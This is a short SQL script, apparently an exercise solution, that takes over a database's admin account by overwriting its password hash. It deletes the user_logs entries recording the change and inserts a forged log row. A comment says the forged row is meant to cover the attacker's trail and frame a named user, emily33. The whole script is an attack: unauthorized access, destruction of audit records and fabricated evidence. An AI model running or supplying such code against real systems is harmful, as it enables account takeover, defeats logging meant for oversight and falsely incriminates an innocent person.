UPDATE users
SET
    password = '982c0381c279d139fd221fce974916e7'
WHERE
    username = 'admin';

DELETE FROM user_logs
WHERE
    new_password = '982c0381c279d139fd221fce974916e7';

-- Add false data to throw others off your trail. In particular, to frame emily33, make it only appear—in the user_logs table—as if the admin account has had its password changed to emily33’s password.
INSERT INTO
    user_logs (
        type,
        old_username,
        new_username,
        old_password,
        new_password
    )
VALUES
    (
        'update',
        'admin',
        'admin',
        (
            SELECT
                password
            FROM
                users
            WHERE
                username = 'admin'
        ),
        (
            SELECT
                password
            FROM
                users
            WHERE
                username = 'emily33'
        )
    );
